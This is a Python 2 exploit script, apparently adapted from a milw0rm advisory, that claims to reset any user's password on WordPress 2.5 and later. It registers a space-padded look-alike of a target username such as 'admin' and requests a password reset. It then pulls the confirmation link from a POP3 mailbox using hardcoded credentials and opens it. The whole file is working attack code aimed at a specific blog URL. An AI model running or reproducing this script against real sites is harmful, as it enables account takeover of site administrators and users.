#!/usr/bin/env python
#coding=utf-8
#author: cocobear.cn@gmail.com
#website:http://cocobear.info

""" exploit description:
        http://milw0rm.com/exploits/6397
    influencing:
        wordpress 2.5 and above
    This short code can change any user's password.
"""

import urllib,cookielib,urllib2,httplib
import sys
import poplib

#all you need to do is change this two lines:
base_url = "http://www.kongove.cn/blog/"
hack_user= "admin"

def init():
    cookie = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))

    exheaders = [("User-Agent","Opera/9.27 (X11; Linux x86_64; U; en)"),("Connection","Keep-Alive"),("Referer","http://zzfw.sn.chinamobile.com"),("Accept","text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),("Accept-Charset","iso-8859-1, utf-8, utf-16, *;q=0.1"),("Cookie2","$Version=1"),]

    opener.addheaders = exheaders
    urllib2.install_opener(opener)
    return opener

   
def register(opener):
    global base_url,hack_user,hack_mail

    #register a hack user
    num = 60 - len(hack_user)
    hack_user = hack_user + " "*num + "x"
    body = (("user_login",hack_user),("user_email",hack_mail),)
    ret  = opener.open(base_url+"action=register",urllib.urlencode(body))
    #print ret.read()

def change_passwd(opener):
    global base_url,hack_mail,hack_pass

    body = (("user_login",hack_mail),)
    print body
    ret  = opener.open(base_url+"action=lostpassword",urllib.urlencode(body))

    print ret.read()

    #get confirm mail
    pop = poplib.POP3('pop.sina.com')
    pop.user(hack_mail)
    pop.pass_(hack_pass)
    count = pop.stat()[0]
    try:
        data = pop.retr(count)[1]
    except poplib.error_proto:
        print 'get mail error'
        return -1

    for l in data:
        print l
        if l.startswith(base_url):
            confirm_url = l
            print "Successful!"

    #visit confirm mail
    ret = opener.open(confirm_url)
    #print ret.read()

    


def main(argv=None):
    opener=init()
    register(opener)
    change_passwd(opener)

hack_mail= "wordpress_sql@sina.com"
hack_pass= "1234566"

base_url+= "wp-login.php?"


if __name__ == "__main__":
    sys.exit(main())
